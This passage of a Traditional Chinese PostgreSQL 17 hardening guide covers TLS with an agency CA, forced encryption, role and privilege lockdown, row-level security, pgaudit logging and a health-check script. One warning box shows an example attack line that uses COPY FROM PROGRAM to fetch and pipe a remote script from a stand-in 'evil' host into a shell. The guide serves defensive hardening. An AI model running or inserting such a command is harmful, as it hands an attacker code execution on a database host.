       s.ssl, s.version, s.cipher, s.client_dn
FROM pg_stat_ssl s JOIN pg_stat_activity a USING (pid)
WHERE a.backend_type = 'client backend';"
```

預期輸出：

```text
-[ RECORD 1 ]----+-------------------
usename          | app_rw
client_addr      | 10.10.20.21
application_name | appdb-worker
ssl              | f                    -- ★★★★★ 這一列是明文，帳密在網路上裸奔
version          |
cipher           |
client_dn        |
-[ RECORD 2 ]----+-------------------
usename          | report_ro
client_addr      | 10.10.30.15
ssl              | t
version          | TLSv1.3              -- ★ 這才是要的
cipher           | TLS_AES_256_GCM_SHA384
client_dn        |
```

★★★★★ **`pg_stat_ssl` 就是你的「還在裸連的是誰」名單。**
這比 MySQL 要去翻 `performance_schema` 直觀得多，善用它。

#### 用機關自建 CA 簽發資料庫憑證

Debian 套件安裝時會自動用 `ssl-cert` 套件的 snakeoil 憑證，
★★★★ 那張憑證的 CN 是機器 hostname、**沒有可信任的簽發者**，客戶端只能用 `sslmode=require`
（只加密、不驗身分），擋不住中間人。

CA 的建置見 [[090-01-08-guide-PKI-用自建CA簽發伺服器憑證]]，這裡只做資料庫這一段：

```bash
# 【1】在資料庫主機產私鑰與 CSR（★★★★ 私鑰不要離開這台機器）
sudo install -d -o postgres -g postgres -m 0700 /etc/postgresql/17/main/ssl
cd /etc/postgresql/17/main/ssl

sudo -u postgres openssl req -new -newkey rsa:2048 -nodes \
  -keyout server.key -out server.csr \
  -subj "/C=TW/O=Example Agency/CN=db01.example.gov.tw" \
  -addext "subjectAltName=DNS:db01.example.gov.tw,DNS:db01,IP:10.10.20.11"
```

預期輸出：

```text
.....+.+...+.....+.+..+....+..
-----
```

> [!danger] ★★★★★ SAN 一定要同時含 DNS 與 IP
> 應用的連線字串如果寫 `host=10.10.20.11`，而憑證 SAN 只有 DNS 名稱，
> `sslmode=verify-full` 就會失敗：
> `server certificate for "db01.example.gov.tw" does not match host name "10.10.20.11"`。
> ★★★★ 動筆前先去問應用組**連線字串到底怎麼寫**，把出現過的每一種形式都放進 SAN。

```bash
# 【2】拿到 CA 簽好的 server.crt 之後，佈署並設權限（★★★★★ 權限錯會起不來）
sudo install -o postgres -g postgres -m 0600 server.key /etc/postgresql/17/main/ssl/server.key
sudo install -o postgres -g postgres -m 0644 server.crt /etc/postgresql/17/main/ssl/server.crt
sudo install -o postgres -g postgres -m 0644 ca-chain.crt /etc/postgresql/17/main/ssl/ca.crt
ls -l /etc/postgresql/17/main/ssl/
```

預期輸出：

```text
-rw-r--r-- 1 postgres postgres 3891 Aug 28 10:22 ca.crt
-rw-r--r-- 1 postgres postgres 1704 Aug 28 10:22 server.crt
-rw------- 1 postgres postgres 1704 Aug 28 10:22 server.key    # ★★★★★ 一定要 0600
```

> [!warning] ★★★★ 私鑰權限的官方規則
> 官方文件寫得很死：`server.key` 的權限**必須禁止 group 與 world 的任何存取**
> （`chmod 0600`）；唯一的替代是**檔案屬於 root 且 group 只有讀取權**（`0640`）。
> 不符合時 PostgreSQL **直接拒絕啟動**，日誌寫
> `private key file "…server.key" has group or world access`。

```bash
# 【3】開啟 SSL
sudo tee -a /etc/postgresql/17/main/conf.d/50-hardening.conf > /dev/null <<'EOF'

# ── TLS ──────────────────────────────────────────────
ssl = on
ssl_cert_file = '/etc/postgresql/17/main/ssl/server.crt'
ssl_key_file  = '/etc/postgresql/17/main/ssl/server.key'
ssl_ca_file   = '/etc/postgresql/17/main/ssl/ca.crt'      # ★★★ 要驗客戶端憑證才需要
# ssl_crl_file = '/etc/postgresql/17/main/ssl/crl.pem'    # ★★★ 有 CRL 就一定要設，見憑證生命週期那篇
ssl_min_protocol_version = 'TLSv1.2'                      # ★★★ 別再收 TLS 1.0/1.1
ssl_prefer_server_ciphers = on
EOF

sudo systemctl reload postgresql@17-main   # ★ ssl 是 sighup 參數，reload 就夠
sudo -u postgres psql -Atc "SHOW ssl;"
```

預期輸出：

```text
on
```

從外部驗證憑證真的換掉了：

```bash
openssl s_client -connect db01.example.gov.tw:5432 -starttls postgres </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
```

預期輸出：

```text
subject=C=TW, O=Example Agency, CN=db01.example.gov.tw
issuer=C=TW, O=Example Agency, CN=Example Agency Issuing CA G1     # ★★★★ 不再是 snakeoil
notBefore=Aug 28 02:10:00 2026 GMT
notAfter=Aug 28 02:10:00 2027 GMT
X509v3 Subject Alternative Name:
    DNS:db01.example.gov.tw, DNS:db01, IP Address:10.10.20.11
```

★★★ `-starttls postgres` 不能省 —— PostgreSQL 是先用自己的協定問「能不能升級成 TLS」，
不是一連上就 TLS 握手，直接 `openssl s_client` 會失敗。

#### 分階段切成強制加密（不中斷服務的順序）

★★★★★ **順序錯了就是全站中斷。** 照這個順序走：

```text
階段 0  量現況    pg_stat_ssl 找出 ssl='f' 的連線 → 得到「還沒改的清單」
        ↓
階段 1  伺服器開  ssl = on，pg_hba 仍是 host（同時收明文與加密）→ 零影響
        ↓
階段 2  客戶端改  逐一把應用的連線字串加 sslmode=verify-full + sslrootcert
        ↓
階段 3  再量一次  pg_stat_ssl 的 ssl='f' 必須歸零，且連續觀察 ≥ 一個完整營運日
        ↓         ★★★★ 含月結、批次、備份、報表這些「一天只跑一次」的東西
        ↓
階段 4  伺服器收  pg_hba 的 host 改成 hostssl，並加 hostnossl … reject
        ↓
階段 5  驗證回滾  故意用 sslmode=disable 連一次，必須被拒
```

客戶端的正確連線字串：

```bash
psql "host=db01.example.gov.tw port=5432 dbname=appdb user=app_rw \
      sslmode=verify-full sslrootcert=/etc/ssl/certs/example-ca.crt channel_binding=require"
```

| `sslmode` | 加密 | 驗 CA | 驗主機名 | 評價 |
| --- | --- | --- | --- | --- |
| `disable` | ❌ | ❌ | ❌ | ★★★★★ 明文，禁止 |
| `allow` / `prefer` | 可能 | ❌ | ❌ | ★★★★ 「可能」等於沒有保證，`prefer` 是 libpq 預設值 |
| `require` | ✅ | ❌ | ❌ | ★★★★ **擋竊聽、不擋冒充**，中間人架假伺服器一樣連得上 |
| `verify-ca` | ✅ | ✅ | ❌ | ★★ 可接受 |
| `verify-full` | ✅ | ✅ | ✅ | ★ **唯一的正解** |

> [!danger] ★★★★ `sslmode=require` 是最常見的假安全
> 應用日誌顯示「已使用 SSL 連線」，稽核表也就打勾了。
> 但 `require` **完全不檢查伺服器是誰**：攻擊者在同網段做 ARP 欺騙、架一台假 PostgreSQL，
> 客戶端**一樣顯示加密成功**，然後把帳號密碼與所有查詢送給攻擊者。
> ★★★★ 加密解決竊聽，驗證解決冒充；只做前者等於只做一半。

**階段 3 的驗證查詢**（★★★★ 這是全篇最該排進巡檢的一行）：

```bash
sudo -u postgres psql -c "
SELECT coalesce(a.client_addr::text,'(local)') AS src, a.usename, a.application_name,
       count(*) AS conns
FROM pg_stat_ssl s JOIN pg_stat_activity a USING (pid)
WHERE s.ssl = false AND a.backend_type='client backend' AND a.client_addr IS NOT NULL
GROUP BY 1,2,3 ORDER BY conns DESC;"
```

預期輸出（可以進階段 4 了）：

```text
 src | usename | application_name | conns
-----+---------+------------------+-------
(0 rows)
```

#### 機器對機器：改用客戶端憑證認證

複寫與備份主機不該用密碼（密碼要放在檔案裡、會過期、會被抄走）。
用 `cert` 方法，★★★ 憑證的 CN 必須等於資料庫角色名，或用 `pg_ident.conf` 對映：

```text
# pg_hba.conf
hostssl replication rep_user 10.10.20.12/32 cert clientcert=verify-full map=certmap
```

```text
# pg_ident.conf  —— MAPNAME  SYSTEM-USERNAME(憑證 CN)   PG-USERNAME
certmap    db02.example.gov.tw    rep_user
```

```bash
sudo systemctl reload postgresql@17-main
sudo -u postgres psql -Atc "SELECT map_name, sys_name, pg_username, error FROM pg_ident_file_mappings;"
```

預期輸出：

```text
certmap|db02.example.gov.tw|rep_user|
```

★★★★ `error` 欄空白才代表對映有載入。複寫本身的設定見 [[060-04-02-07-svc-PostgreSQL-複寫與高可用]]。

### ★★★★ 收斂授權：PUBLIC 是最常被忽略的洞

PostgreSQL 有一個叫 `PUBLIC` 的隱含角色，**每個帳號都自動屬於它**。
預設就授予 PUBLIC 的權限有兩個，都要處理：

```bash
# 【1】任何帳號都能 CONNECT 到任何資料庫 —— ★★★★ 這是預設行為
sudo -u postgres psql -c "REVOKE CONNECT ON DATABASE appdb FROM PUBLIC;"
sudo -u postgres psql -c "GRANT CONNECT ON DATABASE appdb TO app_rw, report_ro;"
```

```bash
# 【2】PG 14 以前，PUBLIC 對 public schema 有 CREATE 權 —— ★★★★★ 任何登入者都能建表
sudo -u postgres psql -d appdb -c "REVOKE CREATE ON SCHEMA public FROM PUBLIC;"
```

> [!warning] ★★★★ PostgreSQL 15 起改了預設值，但**升級上來的舊庫不會自動改**
> PG 15 之後**新建**的資料庫，`public` schema 已不再授予 PUBLIC 的 `CREATE` 權。
> 但你從 PG 13 一路 `pg_upgrade` 上來的那顆庫，**權限是跟著資料走的，不會變**。
> 一定要實際查，不要憑版本號推論：
> ```bash
> sudo -u postgres psql -d appdb -Atc "SELECT nspname, nspacl FROM pg_namespace WHERE nspname='public';"
> ```
> ```text
> public|{postgres=UC/postgres,=U/postgres}      # ★ 只有 U(USAGE)，正確
> public|{postgres=UC/postgres,=UC/postgres}     # ★★★★★ 有 C(CREATE)，要收掉
> ```

**高風險的預定義角色**，盤點誰被授予了：

```bash
sudo -u postgres psql -c "
SELECT r.rolname AS granted_role, m.rolname AS member
FROM pg_auth_members am
JOIN pg_roles r ON r.oid = am.roleid
JOIN pg_roles m ON m.oid = am.member
WHERE r.rolname IN ('pg_read_server_files','pg_write_server_files',
                    'pg_execute_server_program','pg_read_all_data',
                    'pg_write_all_data','pg_signal_backend','pg_monitor')
ORDER BY 1,2;"
```

預期輸出（有問題時）：

```text
       granted_role       |  member
--------------------------+-----------
 pg_execute_server_program | etl_user   -- ★★★★★ 等同 postgres 帳號的 shell
 pg_read_all_data          | report_ro  -- ★★★ 報表帳號通常不需要「所有」資料
```

| 預定義角色 | 實際威力 | 星級 |
| --- | --- | --- |
| `pg_execute_server_program` | 可用 `COPY … FROM PROGRAM` **以 postgres OS 帳號執行任意指令** | ★★★★★ |
| `pg_write_server_files` | 可寫入伺服器檔案系統（可覆蓋 `authorized_keys`） | ★★★★★ |
| `pg_read_server_files` | 可讀 `/etc/passwd`、其他叢集的設定檔 | ★★★★ |
| `pg_write_all_data` | 繞過所有表級權限寫入 | ★★★★ |
| `pg_read_all_data` | 繞過所有表級權限讀取（★★★ 給報表帳號前先想清楚） | ★★★ |
| `pg_signal_backend` | 可砍別人的連線 | ★★ |
| `pg_monitor` | 讀統計與設定，✅ 監控帳號的正確選擇 | ★ |

> [!danger] ★★★★★ `COPY … FROM PROGRAM` 是一條 SQL 注入直達 shell 的路
> ```sql
> COPY t FROM PROGRAM 'curl http://evil/x.sh | sh';
> ```
> 這行會**以 `postgres` OS 帳號執行**。只要應用帳號是 superuser 或有
> `pg_execute_server_program`，一個 SQL 注入漏洞就等於整台主機淪陷。
> ★★★★★ **應用帳號永遠不要是 superuser。** 這是本篇唯一沒有例外的規則。

驗證應用帳號被關在該關的地方：

```bash
sudo -u postgres psql -d appdb -c "
SELECT rolname, rolsuper, rolcreatedb, rolcreaterole, rolbypassrls
FROM pg_roles WHERE rolname = 'app_rw';"
```

預期輸出：

```text
 rolname | rolsuper | rolcreatedb | rolcreaterole | rolbypassrls
---------+----------+-------------+---------------+--------------
 app_rw  | f        | f           | f             | f              # ★ 五個 f
```

### 敏感欄位：RLS 與欄位級權限

```sql
-- ★★★ 欄位級權限：報表帳號看得到姓名，看不到身分證字號
REVOKE SELECT ON citizens FROM report_ro;
GRANT SELECT (id, name, city, created_at) ON citizens TO report_ro;
```

```sql
-- ★★★ 列級安全：承辦人只看得到自己轄區的資料
ALTER TABLE cases ENABLE ROW LEVEL SECURITY;
ALTER TABLE cases FORCE ROW LEVEL SECURITY;      -- ★★★★ 沒有這行，表的擁有者會繞過
CREATE POLICY case_by_dept ON cases
  USING (dept_code = current_setting('app.dept_code', true));
```

> [!warning] ★★★★ RLS 有三種人繞得過去
> 1. **superuser** —— 永遠繞過
> 2. 有 `BYPASSRLS` 屬性的角色
> 3. ★★★★ **表的擁有者**（除非加了 `FORCE ROW LEVEL SECURITY`）
>
> 所以 RLS 只有在「應用帳號不是表擁有者、也不是 superuser」時才有意義。
> 正確配置：`schema_owner` 擁有表，`app_rw` 只有 DML 權限。

`GRANT` / `REVOKE` 的完整語法與 `ALTER DEFAULT PRIVILEGES` 見
[[060-04-02-02-cmd-PostgreSQL-角色與權限]] 與 [[060-04-01-03-cmd-MySQL-SQL基礎操作]]。

### ★★★★ 稽核軌跡：log 參數 + pgaudit

#### 第一層：內建的連線與語句日誌（零成本，先做這個）

```bash
sudo tee -a /etc/postgresql/17/main/conf.d/50-hardening.conf > /dev/null <<'EOF'

# ── 稽核日誌 ──────────────────────────────────────────
log_connections = on                  # ★★★★ 誰、從哪裡、什麼時候連進來
log_disconnections = on               # ★★★ 連線時長（判斷「撈很久」的行為）
log_statement = 'ddl'                 # ★★★ 至少記 DDL；'mod' 會連 INSERT/UPDATE/DELETE 都記
log_hostname = off                    # ★★★ 開了會對每條連線做反解，拖慢連線建立
log_line_prefix = '%m [%p] %q%u@%d/%a %h '   # ★★★★ 時間 pid 帳號 庫 應用名 來源IP
log_min_duration_statement = 3000     # ★★ 慢查詢（3 秒），順便當異常撈取的線索
log_min_messages = warning
log_checkpoints = on
log_lock_waits = on
log_error_verbosity = default
EOF

sudo systemctl reload postgresql@17-main
```

驗證日誌格式真的變了：

```bash
psql "host=10.10.20.11 dbname=appdb user=app_rw sslmode=verify-full" -c "SELECT 1" >/dev/null
sudo tail -n 4 /var/log/postgresql/postgresql-17-main.log
```

預期輸出：

```text
2026-08-28 11:03:12.441 CST [3812] app_rw@appdb/psql 10.10.20.21 LOG:  connection authorized: user=app_rw database=appdb SSL enabled (protocol=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384)
2026-08-28 11:03:12.502 CST [3812] app_rw@appdb/psql 10.10.20.21 LOG:  disconnection: session time: 0:00:00.061 user=app_rw database=appdb host=10.10.20.21
```

★★★★ `connection authorized` 這行會**直接寫出用了哪個 TLS 版本與 cipher** ——
這是稽核回覆表最好用的證據，比截圖強。

> [!info]- PostgreSQL 18 起 `log_connections` 變成清單型參數
> v18 把 `log_connections` 從布林改成可以指定 `'receipt,authentication,authorization'`
> 之類的清單，可以只記你要的階段。★★★ 16/17 維持布林 `on`/`off`。
> 升級到 18 之前先確認你的設定檔還吃不吃得下 `on`（相容值仍保留，但請以升級當下的
> release note 為準）。

#### 第二層：pgaudit（★★★★ 這才叫稽核軌跡）

內建的 `log_statement='mod'` 有兩個致命缺點：**記不到 SELECT**，
而且**記不到「這句話動到哪張表」**。`pgaudit` 兩個都解決。

```bash
sudo apt-get install -y postgresql-17-pgaudit
```

預期輸出：

```text
Setting up postgresql-17-pgaudit (17.x-1.pgdg24.04+1) ...
```

> [!warning] 未實機驗證
> pgaudit 的套件名與可用版本會隨 PGDG 套件庫調整（RHEL 系一般是 `pgaudit_17`）。
> 動手前先 `apt-cache search pgaudit` 或 `dnf search pgaudit` 確認實際名稱，
> 並對照 <https://github.com/pgaudit/pgaudit> 的版本相容表（pgaudit 主版本要對上
> PostgreSQL 主版本）。套件庫設定見 [[020-02-03-03-cmd-標準化-第三方APT套件庫實務]]。

```bash
sudo tee -a /etc/postgresql/17/main/conf.d/50-hardening.conf > /dev/null <<'EOF'

# ── pgaudit ──────────────────────────────────────────
shared_preload_libraries = 'pgaudit'   # ★★★★ 這行需要 restart，不是 reload
pgaudit.log = 'ddl, role, write'       # ★★★ 全庫層級：結構變更、權限變更、寫入
pgaudit.log_catalog = off              # ★★★ 關掉系統目錄查詢，不然日誌會被 psql 的 \d 灌爆
pgaudit.log_relation = on              # ★★★★ 每個受影響的資料表獨立記一行
pgaudit.log_parameter = off            # ★★★★★ 開了會把參數值寫進日誌 = 個資進日誌
pgaudit.log_client = off
pgaudit.log_level = log
EOF

sudo systemctl restart postgresql@17-main
sudo -u postgres psql -Atc "SHOW shared_preload_libraries;"
```

預期輸出：

```text
pgaudit
```

★★★★ **只稽核敏感表（object audit logging）** —— 這是 pgaudit 最實用的功能，
避免「全記」把磁碟寫爆：

```sql
-- 建一個只用來標記「哪些東西要被稽核」的角色
CREATE ROLE auditor NOLOGIN;
GRANT SELECT, INSERT, UPDATE, DELETE ON citizens TO auditor;
```

```bash
sudo -u postgres psql -c "ALTER SYSTEM SET pgaudit.role = 'auditor';"
sudo systemctl reload postgresql@17-main
```

驗證軌跡真的產生了：

```bash
psql "host=10.10.20.11 dbname=appdb user=app_rw sslmode=verify-full" \
  -c "SELECT name FROM citizens WHERE id = 1001;" >/dev/null
sudo grep 'AUDIT:' /var/log/postgresql/postgresql-17-main.log | tail -n 2
```

預期輸出：

```text
2026-08-28 11:20:44.118 CST [4021] app_rw@appdb/psql 10.10.20.21 LOG:  AUDIT: OBJECT,1,1,READ,SELECT,TABLE,public.citizens,"SELECT name FROM citizens WHERE id = 1001;",<not logged>
```

★★★★★ 這一行同時回答了稽核最愛問的四個問題：
**誰**（`app_rw`）、**從哪**（`10.10.20.21`）、**什麼時候**、**撈了哪張表的什麼**。
`<not logged>` 是因為 `pgaudit.log_parameter = off` —— ★★★★ **這是刻意的**，
參數值裡通常就是身分證字號。

> [!danger] ★★★★★ 稽核日誌本身就是一份高敏感資料
> `log_statement='all'` 或 `pgaudit.log_parameter=on` 會把
> `WHERE id_number = 'A123456789'` 這種查詢**原封不動**寫進純文字日誌。
> 那個日誌檔的權限、輪替、保存期限、誰能讀，全部要比照個資資料庫管理。
> ★★★★ 送集中日誌前先確認 SIEM 那端的存取控制也到位，見 [[090-05-09-guide-資安設備-日誌集中與SIEM]]。

**日誌一定要送出去**（本機日誌在入侵時會被刪）：

```bash
# ★★★ 讓 filebeat / Wazuh agent 讀得到
sudo usermod -aG adm wazuh
sudo ls -l /var/log/postgresql/
```

預期輸出：

```text
-rw-r----- 1 postgres adm 184213 Aug 28 11:20 postgresql-17-main.log   # ★ group=adm 可讀
```

該告警的四件事（規則寫法見 [[090-08-05-guide-Wazuh-日誌蒐集與解析]]）：

| 日誌特徵 | 代表 | 星級 |
| --- | --- | --- |
| 同來源 5 分鐘內 ≥ 10 次 `password authentication failed` | 密碼噴灑 | ★★★★ |
| 出現 `no pg_hba.conf entry` 且來源不在白名單 | 有人在試探 | ★★★★ |
| `AUDIT: … ,READ,SELECT,TABLE,public.citizens` 在非上班時間 | 異常撈取 | ★★★★★ |
| `AUDIT: … ,ROLE,GRANT` / `ALTER ROLE … SUPERUSER` | 權限被提升 | ★★★★★ |

### 靜態資料：沒有 TDE 的三層替代

★★★★ PostgreSQL 社群版**沒有透明資料加密**。三層各擋不同的威脅，不能互相取代：

| 層 | 做法 | 擋得住 | 擋不住 |
| --- | --- | --- | --- |
| ★★★★ 磁碟 | LUKS 全碟加密 | 硬碟被搬走、送修未消磁、VM 磁碟檔被複製 | 主機開機後的任何存取 |
| ★★★★★ 備份檔 | `pg_dump \| age -r …` 或 `gpg` | dump 檔被複製、備份磁帶外流、丟到雲端儲存 | 有資料庫帳號的人 |
| ★★★ 欄位 | `pgcrypto` 的 `pgp_sym_encrypt` | ★★ DBA 直接 `SELECT` 看到明文 | 應用被入侵（應用有金鑰） |

```sql
-- ★★★ pgcrypto 範例：金鑰由應用傳入，不要寫死在資料庫裡
CREATE EXTENSION IF NOT EXISTS pgcrypto;
INSERT INTO secrets(owner, blob) VALUES ('alice', pgp_sym_encrypt('A123456789', :'key'));
SELECT pgp_sym_decrypt(blob, :'key') FROM secrets WHERE owner = 'alice';
```

> [!danger] ★★★★ pgcrypto 的金鑰會進日誌
> 上面那句 SQL 如果被 `log_statement='all'` 或 `log_min_duration_statement` 記到，
> **金鑰就會以明文寫進日誌檔**，等於加密沒做。
> ★★★★ 一定要用**綁定參數**（prepared statement）傳金鑰，不要字串串接；
> 並確認 `pgaudit.log_parameter = off`。

備份檔的加密與**還原演練**在 [[060-04-02-05-svc-PostgreSQL-備份與還原]] 與 [[060-01-06-03-guide-傳輸-備份策略與還原演練]]，
本篇不重複。這裡只強調一句：★★★★★ **一份沒加密的 `pg_dump` 檔，
就是一份可以整包帶走的個資資料庫。**

### OS 層與擴充白名單

```bash
# ★★★★ 資料目錄權限：PostgreSQL 啟動時會自己檢查，不符就拒絕啟動
sudo ls -ld /var/lib/postgresql/17/main
```

預期輸出：

```text
drwx------ 19 postgres postgres 4096 Aug 28 09:40 /var/lib/postgresql/17/main   # ★ 0700
```

```bash
# ★★★ 盤點已安裝的擴充：有沒有你不認識的
sudo -u postgres psql -d appdb -c "\dx"
```

預期輸出：

```text
   Name    | Version |   Schema   |              Description
-----------+---------+------------+---------------------------------------
 pgaudit   | 17.0    | public     | provides auditing functionality
 pgcrypto  | 1.3     | public     | cryptographic functions
 plpgsql   | 1.0     | pg_catalog | PL/pgSQL procedural language
```

> [!danger] ★★★★★ 不受信任的程序語言等於 shell
> `plpython3u`、`plperlu`、`pltclu` 這些名字結尾有 **`u`（untrusted）** 的語言，
> 函式內容**以 postgres OS 帳號執行任意程式碼**。
> 只有 superuser 能建立這類語言的函式，但這正是「應用帳號不能是 superuser」的另一個理由。
> ```bash
> sudo -u postgres psql -d appdb -Atc "SELECT lanname FROM pg_language WHERE NOT lanpltrusted;"
> ```
> 輸出只該有 `c` 與 `internal`。出現 `plpython3u` 就要問清楚是誰、為什麼裝的。

AppArmor（Ubuntu）／SELinux（RHEL）的規則見 [[090-02-07-guide-防護-SELinux與AppArmor]]。
★★★★ RHEL 系把憑證放在 `/etc/pki/tls/private/` 以外的路徑，SELinux 會擋住讀取，
症狀是「權限明明對，卻說 Permission denied」。

---

## 完整實戰範例

情境：機關的個資系統資料庫 `db01`（Ubuntu 24.04 + PostgreSQL 17），
資安稽核指出三項缺失 ——「資料庫對外開放」「使用弱雜湊認證」「無存取軌跡」。
要在**不中斷服務**的前提下整改，並產出稽核回覆。

### 步驟 0：加固檢查腳本

先寫檢查腳本，才能量出「整改前」的基線，也才能證明「整改後」。

```bash
sudo tee /usr/local/bin/pg-hardening-check.sh > /dev/null <<'SCRIPT'
#!/usr/bin/env bash
# pg-hardening-check.sh — PostgreSQL 安全組態健檢
# 用法：sudo pg-hardening-check.sh [叢集版本] [叢集名]
# 離開碼：0=全部通過 1=有高風險項未通過 2=只有中風險項未通過 3=執行環境錯誤
set -euo pipefail

PGVER="${1:-17}"
PGCLUSTER="${2:-main}"
PSQL=(sudo -u postgres psql -qtAX -v ON_ERROR_STOP=1)

HIGH_FAIL=0; MED_FAIL=0; PASS=0
RED=$'\033[31m'; YLW=$'\033[33m'; GRN=$'\033[32m'; OFF=$'\033[0m'

die() { echo "${RED}[致命] $*${OFF}" >&2; exit 3; }

check() {   # check <風險等級 high|med> <項目名> <期望值> <實際值>
  local lvl="$1" name="$2" want="$3" got="$4"
  if [[ "$got" == "$want" ]]; then
    printf '%-46s %s通過%s  (%s)\n' "$name" "$GRN" "$OFF" "$got"; PASS=$((PASS+1))
  elif [[ "$lvl" == "high" ]]; then
    printf '%-46s %s未通過%s 期望=%s 實際=%s\n' "$name" "$RED" "$OFF" "$want" "$got"
    HIGH_FAIL=$((HIGH_FAIL+1))
  else
    printf '%-46s %s待改善%s 期望=%s 實際=%s\n' "$name" "$YLW" "$OFF" "$want" "$got"
    MED_FAIL=$((MED_FAIL+1))
  fi
}

# ── 前置檢查（★★★ 環境不對就早點失敗，不要跑出誤導的報告）────────
[[ $EUID -eq 0 ]] || die "請用 sudo 執行（需要讀取資料目錄權限）"
command -v psql >/dev/null || die "找不到 psql"
"${PSQL[@]}" -c "SELECT 1" >/dev/null 2>&1 || die "無法以 postgres 身分連線，請確認服務是否啟動"

CONF_DIR="/etc/postgresql/${PGVER}/${PGCLUSTER}"
DATA_DIR="$("${PSQL[@]}" -c "SHOW data_directory")"
[[ -d "$DATA_DIR" ]] || die "資料目錄不存在：$DATA_DIR"

echo "==============================================================="
echo " PostgreSQL 安全組態健檢   $(date '+%F %T')"
echo " 主機：$(hostname -f)   叢集：${PGVER}/${PGCLUSTER}"
echo " 版本：$("${PSQL[@]}" -c "SHOW server_version")"
echo "==============================================================="

echo; echo "── ① 網路層 ──────────────────────────────────────────"
LISTEN="$("${PSQL[@]}" -c "SHOW listen_addresses")"
if [[ "$LISTEN" == "*" || "$LISTEN" == "0.0.0.0" ]]; then
  check high "listen_addresses 不得為 *" "指定介面" "$LISTEN"
else
  check high "listen_addresses 不得為 *" "指定介面" "指定介面"
fi
UFW_ANY="$(ufw status 2>/dev/null | grep -c '5432.*Anywhere' || true)"
check high "防火牆 5432 無 Anywhere 規則" "0" "$UFW_ANY"

echo; echo "── ② 准入層 pg_hba ───────────────────────────────────"
for m in trust password ident; do
  N="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_hba_file_rules WHERE auth_method='$m' AND type<>'local'")"
  check high "pg_hba 無 $m（非 local）" "0" "$N"
done
N_MD5="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_hba_file_rules WHERE auth_method='md5'")"
check med  "pg_hba 無 md5" "0" "$N_MD5"
N_ERR="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_hba_file_rules WHERE error IS NOT NULL")"
check high "pg_hba 無解析錯誤" "0" "$N_ERR"
N_HOST="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_hba_file_rules WHERE type='host' AND auth_method<>'reject'")"
check med  "TCP 規則全為 hostssl" "0" "$N_HOST"

echo; echo "── ③ 認證層 ──────────────────────────────────────────"
check high "password_encryption=scram-sha-256" "scram-sha-256" \
      "$("${PSQL[@]}" -c "SHOW password_encryption")"
N_MD5PW="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_authid WHERE rolpassword LIKE 'md5%'")"
check high "無 md5 雜湊的帳號" "0" "$N_MD5PW"
N_NOPW="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_authid WHERE rolcanlogin AND rolpassword IS NULL AND rolname<>'postgres'")"
check high "無「可登入但沒密碼」的帳號" "0" "$N_NOPW"

echo; echo "── ④ 授權層 ──────────────────────────────────────────"
N_SUPER="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_roles WHERE rolsuper AND rolname<>'postgres'")"
check high "額外的 superuser 帳號" "0" "$N_SUPER"
N_EXEC="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_auth_members am JOIN pg_roles r ON r.oid=am.roleid WHERE r.rolname='pg_execute_server_program'")"
check high "無人擁有 pg_execute_server_program" "0" "$N_EXEC"
N_UNTRUSTED="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_language WHERE NOT lanpltrusted AND lanname NOT IN ('c','internal')")"
check high "無 untrusted 程序語言" "0" "$N_UNTRUSTED"

echo; echo "── ⑤ 傳輸層 ──────────────────────────────────────────"
check high "ssl = on" "on" "$("${PSQL[@]}" -c "SHOW ssl")"
check med  "ssl_min_protocol_version >= TLSv1.2" "TLSv1.2" \
      "$("${PSQL[@]}" -c "SHOW ssl_min_protocol_version")"
KEY="$("${PSQL[@]}" -c "SHOW ssl_key_file")"
[[ "$KEY" = /* ]] || KEY="${DATA_DIR}/${KEY}"
if [[ -f "$KEY" ]]; then
  check high "私鑰權限為 0600" "600" "$(stat -c '%a' "$KEY")"
else
  check high "私鑰權限為 0600" "600" "找不到 $KEY"
fi
N_PLAIN="$("${PSQL[@]}" -c "SELECT count(*) FROM pg_stat_ssl s JOIN pg_stat_activity a USING(pid) WHERE s.ssl=false AND a.client_addr IS NOT NULL")"
check high "目前無明文的 TCP 連線" "0" "$N_PLAIN"

echo; echo "── ⑥ 稽核層 ──────────────────────────────────────────"
check high "log_connections = on"    "on"  "$("${PSQL[@]}" -c "SHOW log_connections")"
check med  "log_disconnections = on" "on"  "$("${PSQL[@]}" -c "SHOW log_disconnections")"
SPL="$("${PSQL[@]}" -c "SHOW shared_preload_libraries")"
check med  "pgaudit 已載入" "yes" "$([[ "$SPL" == *pgaudit* ]] && echo yes || echo no)"
check high "pgaudit.log_parameter 未開啟（避免個資進日誌）" "off" \
      "$("${PSQL[@]}" -c "SHOW pgaudit.log_parameter" 2>/dev/null || echo off)"

echo; echo "── ⑦ OS 層 ──────────────────────────────────────────"
check high "資料目錄權限 0700" "700" "$(stat -c '%a' "$DATA_DIR")"
check med  "設定目錄不可被 others 讀" "yes" \
      "$([[ -d "$CONF_DIR" && "$(stat -c '%a' "$CONF_DIR")" != *[1-7] ]] && echo yes || echo no)"

echo
echo "==============================================================="
printf '統計：通過 %d ／ 高風險未通過 %d ／ 中風險未通過 %d\n' "$PASS" "$HIGH_FAIL" "$MED_FAIL"
echo "==============================================================="
if   (( HIGH_FAIL > 0 )); then exit 1
elif (( MED_FAIL  > 0 )); then exit 2
else exit 0; fi
SCRIPT

sudo chmod 0750 /usr/local/bin/pg-hardening-check.sh
```

### 步驟 1：取得整改前基線

```bash
sudo /usr/local/bin/pg-hardening-check.sh 17 main | sudo tee /var/log/pg-hardening-before.txt
echo "exit=$?"
```

預期輸出（整改前）：

```text
===============================================================
 PostgreSQL 安全組態健檢   2026-08-28 09:15:02
 主機：db01.example.gov.tw   叢集：17/main
 版本：17.5 (Ubuntu 17.5-1.pgdg24.04+1)
===============================================================

── ① 網路層 ──────────────────────────────────────────
listen_addresses 不得為 *                      未通過 期望=指定介面 實際=*
防火牆 5432 無 Anywhere 規則                   未通過 期望=0 實際=1

── ② 准入層 pg_hba ───────────────────────────────────
pg_hba 無 trust（非 local）                    未通過 期望=0 實際=1
pg_hba 無 password（非 local）                 通過  (0)
pg_hba 無 ident（非 local）                    通過  (0)
